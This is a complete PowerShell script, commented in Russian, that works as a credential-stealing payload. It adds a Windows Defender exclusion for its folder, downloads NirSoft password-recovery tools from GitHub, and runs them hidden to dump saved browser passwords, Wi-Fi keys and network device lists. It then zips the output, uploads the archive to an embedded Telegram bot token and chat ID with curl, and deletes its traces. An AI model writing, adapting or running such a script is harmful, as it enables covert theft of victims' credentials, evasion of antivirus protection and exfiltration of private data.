$basePath = "C:\Users\Public\Documents\scripts"
$dumpFolder = "$basePath\Report"
$dumpFile = "$basePath\data.zip"

# 1. Подготовка
if (Test-Path $basePath) { Remove-Item -Recurse -Force $basePath -ErrorAction SilentlyContinue }
New-Item -ItemType Directory -Path $dumpFolder -Force | Out-Null
Set-Location $basePath

# 2. Исключение
Add-MpPreference -ExclusionPath $basePath -Force -ErrorAction SilentlyContinue

# 3. Скачивание (используем твои ссылки)
$linkMy = "https://raw.githubusercontent.com/whetherit/tools/main/WebBrowserPassView.exe"
$linkWifi = "https://raw.githubusercontent.com/tuconnaisyouknow/BadUSB_passStealer/main/other_files/WirelessKeyView.exe"
$linkNet = "https://raw.githubusercontent.com/tuconnaisyouknow/BadUSB_passStealer/main/other_files/WNetWatcher.exe"

Invoke-WebRequest $linkMy -OutFile "WebBrowserPassView.exe"
Invoke-WebRequest $linkWifi -OutFile "WirelessKeyView.exe"
Invoke-WebRequest $linkNet -OutFile "WNetWatcher.exe"

# РАЗБЛОКИРОВКА (обязательно!)
Get-ChildItem "$basePath\*.exe" | Unblock-File

# 4. Запуск с ожиданием (Wait)
# Параметр -Wait не даст скрипту идти дальше, пока программа не запишет файл
Start-Process -FilePath ".\WebBrowserPassView.exe" -ArgumentList "/stext passwords.txt" -WindowStyle Hidden -Wait
Start-Process -FilePath ".\WirelessKeyView.exe" -ArgumentList "/stext wifi.txt" -WindowStyle Hidden -Wait
Start-Process -FilePath ".\WNetWatcher.exe" -ArgumentList "/stext connected_devices.txt" -WindowStyle Hidden -Wait

# Дополнительная пауза на всякий случай
Start-Sleep -Seconds 2

# 5. Собираем ТОЛЬКО текстовые файлы
$files = Get-ChildItem -Path . -Filter "*.txt"
if ($files) {
    Move-Item $files -Destination $dumpFolder -Force
    Compress-Archive -Path "$dumpFolder\*" -DestinationPath $dumpFile -Force
}

# 6. Отправка
$token = "8453011015:AAFvYt0ZjgkUFAjtnLvONdmXl19l7GK9tfM"
$chatID = "806761221"

if (Test-Path $dumpFile) {
    & curl.exe -F "chat_id=$chatID" -F "document=@$dumpFile" "https://api.telegram.org/bot$token/sendDocument"
}

# 7. Очистка
Set-Location "C:\Users\Public"
Remove-Item -Recurse -Force $basePath -ErrorAction SilentlyContinue
